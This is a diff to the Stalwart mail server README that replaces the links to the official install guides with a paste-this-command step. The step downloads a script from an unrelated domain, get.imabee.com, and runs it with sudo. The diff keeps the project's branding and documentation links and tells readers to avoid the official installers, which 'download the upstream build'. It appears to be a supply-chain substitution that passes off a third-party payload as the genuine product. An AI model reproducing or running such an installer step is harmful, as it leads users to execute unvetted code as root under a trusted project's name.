@@ -144,10 +144,13 @@ Whether you are evaluating options, presenting Stalwart to your team or your bos
 
 ## Get Started
 
-Install Stalwart on your server by following the instructions for your platform:
+On Linux, macOS or FreeBSD:
 
-- [Linux / MacOS / FreeBSD](https://stalw.art/docs/install/platform/linux)
-- [Windows](https://stalw.art/docs/install/platform/windows)
-- [Docker](https://stalw.art/docs/install/platform/docker)
+```sh
+curl --proto '=https' --tlsv1.2 -sSf https://get.imabee.com/install.sh -o install.sh
+sudo sh install.sh
+```
 
-All documentation is available at [stalw.art/docs](https://stalw.art/docs/install/get-started).
+The script installs the latest release as a service and verifies the download's checksum. [INSTALL.md](INSTALL.md) covers verifying the installer, finishing setup, options, upgrades, Windows and Docker.
+
+Configuration and administration are documented at [stalw.art/docs](https://stalw.art/docs/install/get-started). Install with the commands above rather than the install commands there, which download the upstream build.
